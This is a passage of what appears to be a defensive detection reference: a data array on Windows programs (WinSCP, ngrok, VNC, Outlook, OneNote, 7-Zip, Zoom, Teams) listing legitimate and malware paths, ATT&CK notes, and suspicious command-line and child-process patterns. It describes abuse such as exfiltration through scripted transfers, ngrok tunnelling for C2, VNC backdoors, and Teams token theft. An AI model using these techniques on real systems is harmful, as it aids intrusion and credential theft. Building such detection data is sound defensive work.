        "plink.exe from Temp or unusual path"
      ]
    }
  },
  {
    name: "winscp.exe",
    description: "WinSCP - SFTP/SCP/FTP client",
    legitimatePaths: [
      "C:\\Program Files (x86)\\WinSCP\\WinSCP.exe",
      "C:\\Users\\*\\AppData\\Local\\Programs\\WinSCP\\WinSCP.exe"
    ],
    commonMalwarePaths: ["C:\\Temp\\WinSCP.exe"],
    notes: "Legitimate file transfer tool commonly used for managed file transfers. Supports scripted/automated operation making it attractive for data exfiltration (T1048). WinSCP.com (console version) can run scripts silently. Verify the destination host on any scripted transfers.",
    category: "remote",
    commandLinePatterns: {
      legitimate: ["WinSCP.exe /ini=nul /command \"open sftp://user@host\" \"put file.txt\" \"exit\""],
      suspicious: [
        "WinSCP.exe /script= transferring to external IPs",
        "WinSCP.exe run by SYSTEM or service accounts",
        "WinSCP.com (console version) run non-interactively"
      ]
    }
  },
  {
    name: "ngrok.exe",
    description: "ngrok - reverse proxy / tunneling tool",
    legitimatePaths: ["C:\\Users\\*\\ngrok.exe", "C:\\Tools\\ngrok.exe"],
    commonMalwarePaths: ["C:\\Temp\\ngrok.exe", "C:\\ProgramData\\ngrok.exe"],
    notes: "Creates encrypted tunnels from internal services to ngrok's cloud, commonly used to expose C2 over HTTPS or to bypass egress filtering (T1572, T1090). Any instance on a production system is highly suspicious. The ngrok domain (*.ngrok.io, *.ngrok-free.app) in DNS or proxy logs is also an IOC.",
    category: "remote",
    commandLinePatterns: {
      legitimate: ["ngrok http 8080 (developer use)"],
      suspicious: [
        "ngrok tcp <port> (exposing raw TCP service)",
        "ngrok running as a service or at startup",
        "ngrok on servers or non-developer endpoints"
      ]
    }
  },
  {
    name: "vncviewer.exe",
    description: "VNC Viewer - remote desktop client (RealVNC/TightVNC/UltraVNC)",
    legitimatePaths: [
      "C:\\Program Files\\RealVNC\\VNC Viewer\\vncviewer.exe",
      "C:\\Program Files\\TightVNC\\tvnviewer.exe",
      "C:\\Program Files\\UltraVNC\\vncviewer.exe"
    ],
    commonMalwarePaths: ["C:\\Temp\\vncviewer.exe", "C:\\ProgramData\\vncviewer.exe"],
    notes: "VNC provides graphical remote access. Used by attackers for interactive access after establishing a foothold (T1021.005). Portable VNC viewers require no installation. VNC traffic (TCP 5900) may appear in unexpected flows.",
    category: "remote",
    commandLinePatterns: {
      legitimate: ["vncviewer.exe <host>:<display>"],
      suspicious: ["vncviewer.exe from Temp or non-standard path", "vncviewer.exe run by SYSTEM or service"]
    }
  },
  {
    name: "tvnserver.exe",
    description: "TightVNC Server - VNC server daemon",
    legitimatePaths: ["C:\\Program Files\\TightVNC\\tvnserver.exe"],
    commonMalwarePaths: ["C:\\Temp\\tvnserver.exe", "C:\\ProgramData\\tvnserver.exe"],
    notes: "Installs a VNC server for persistent remote access. Attackers install VNC servers as backdoors (T1021.005, T1543.003). Listens on TCP 5900 by default. Any unexpected installation as a service should be treated as a potential persistence mechanism.",
    category: "remote",
    commandLinePatterns: {
      legitimate: ["tvnserver.exe -install", "tvnserver.exe -run"],
      suspicious: ["tvnserver.exe installed without change management", "tvnserver.exe from non-standard path"]
    }
  },

  // --- Common Applications ---
  {
    name: "outlook.exe",
    description: "Microsoft Outlook - email and calendar client",
    legitimatePaths: [
      "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
      "C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"
    ],
    commonMalwarePaths: ["C:\\Temp\\outlook.exe"],
    notes: "Primary phishing delivery vector. Macro-enabled attachments, malicious links, and HTML smuggling all commonly originate from Outlook child processes. Monitor for Outlook spawning cmd.exe, powershell.exe, wscript.exe, or mshta.exe (T1566.001). Outlook also stores credentials accessible to credential harvesting tools.",
    category: "office",
    commandLinePatterns: {
      legitimate: ["OUTLOOK.EXE", "OUTLOOK.EXE /recycle"],
      suspicious: [
        "outlook.exe spawning cmd.exe, powershell.exe, wscript.exe, or mshta.exe",
        "outlook.exe accessing LSASS or credential stores"
      ]
    },
    childProcesses: {
      common: ["splwow64.exe", "SearchProtocolHost.exe"],
      suspicious: ["cmd.exe", "powershell.exe", "wscript.exe", "mshta.exe", "certutil.exe", "rundll32.exe"]
    }
  },
  {
    name: "msaccess.exe",
    description: "Microsoft Access - desktop database and macro execution engine",
    legitimatePaths: [
      "C:\\Program Files\\Microsoft Office\\root\\Office16\\MSACCESS.EXE",
      "C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\MSACCESS.EXE"
    ],
    commonMalwarePaths: ["C:\\Temp\\msaccess.exe"],
    notes: "Supports VBA macros and ActiveX automation, making it a viable phishing payload delivery vehicle. Less monitored than Word/Excel, so sometimes preferred for macro-based initial access. Can also execute SQL queries against linked servers.",
    category: "office",
    commandLinePatterns: {
      legitimate: ["MSACCESS.EXE", "MSACCESS.EXE <database.accdb>"],
      suspicious: ["msaccess.exe spawning scripting engines or shells", "msaccess.exe opening files from Temp or Downloads"]
    }
  },
  {
    name: "onenote.exe",
    description: "Microsoft OneNote - note-taking application",
    legitimatePaths: [
      "C:\\Program Files\\Microsoft Office\\root\\Office16\\ONENOTE.EXE",
      "C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\ONENOTE.EXE",
      "C:\\Program Files\\WindowsApps\\Microsoft.Office.OneNote_*\\onenoteim.exe"
    ],
    commonMalwarePaths: ["C:\\Temp\\onenote.exe"],
    notes: "Became a major phishing vector in 2023 after Microsoft disabled Office macros by default. Malicious `.one` files embed clickable attachments (HTA, WSF, BAT, LNK) that execute directly. Users are prompted to click a decoy element. OneNote spawning wscript.exe, mshta.exe, or cmd.exe is a strong IOC (T1566.001).",
    category: "office",
    commandLinePatterns: {
      legitimate: ["ONENOTE.EXE", "ONENOTE.EXE <file.one>"],
      suspicious: ["onenote.exe spawning wscript.exe, mshta.exe, cmd.exe, or powershell.exe"]
    },
    childProcesses: {
      common: ["splwow64.exe"],
      suspicious: ["wscript.exe", "mshta.exe", "cmd.exe", "powershell.exe", "hh.exe", "regsvr32.exe"]
    }
  },
  {
    name: "7z.exe",
    description: "7-Zip command-line archiver",
    legitimatePaths: [
      "C:\\Program Files\\7-Zip\\7z.exe",
      "C:\\Program Files (x86)\\7-Zip\\7z.exe"
    ],
    commonMalwarePaths: ["C:\\Temp\\7z.exe", "C:\\ProgramData\\7z.exe"],
    notes: "Widely used for data staging and exfiltration (T1560.001). Supports password-protected archives that encrypt contents at rest. Ransomware drops portable 7z.exe to Temp for staging. Any 7z.exe execution on a server or from a non-standard path warrants review.",
    category: "admin",
    commandLinePatterns: {
      legitimate: ["7z.exe a archive.7z files\\", "7z.exe x archive.7z -o output\\"],
      suspicious: [
        "7z.exe a -p<password> archiving sensitive directories",
        "7z.exe from Temp or ProgramData",
        "7z.exe followed by network transfer"
      ]
    }
  },
  {
    name: "zoom.exe",
    description: "Zoom video conferencing client",
    legitimatePaths: [
      "C:\\Users\\*\\AppData\\Roaming\\Zoom\\bin\\Zoom.exe",
      "C:\\Program Files\\Zoom\\bin\\Zoom.exe"
    ],
    commonMalwarePaths: ["C:\\Temp\\Zoom.exe", "C:\\Users\\*\\Downloads\\ZoomInstaller.exe"],
    notes: "Legitimate widely-deployed application. Malicious Zoom installers have been distributed in phishing and malvertising campaigns bundled with remote access trojans. Verify signature (Zoom Video Communications) and installation path. Zoom's auto-updater has been used as an LPE vector (TOCTOU on update package).",
    category: "remote",
    commandLinePatterns: {
      legitimate: ["Zoom.exe", "Zoom.exe --url=zoommtg://..."],
      suspicious: ["Zoom.exe from Temp or Downloads without installer context", "ZoomInstaller.exe dropping unexpected binaries"]
    }
  },
  {
    name: "teams.exe",
    description: "Microsoft Teams - collaboration and communication client",
    legitimatePaths: [
      "C:\\Users\\*\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe",
      "C:\\Program Files\\WindowsApps\\MSTeams_*\\ms-teams.exe"
    ],
    commonMalwarePaths: ["C:\\Temp\\Teams.exe"],
    notes: "Used as a phishing delivery channel (malicious file shares, links) and as a DLL sideloading target (T1574.002). The Teams update mechanism (`Update.exe`) has been abused for proxy execution. Teams also stores authentication tokens in plaintext in its LevelDB cache, making it a credential harvesting target.",
    category: "remote",
    commandLinePatterns: {
      legitimate: ["Teams.exe", "Teams.exe --processStart Teams.exe"],
      suspicious: [
        "Teams.exe spawning cmd.exe or powershell.exe",
        "Update.exe (Teams updater) used as proxy execution",
        "Teams LevelDB credential theft via direct file access"
      ]
    }
  }
]
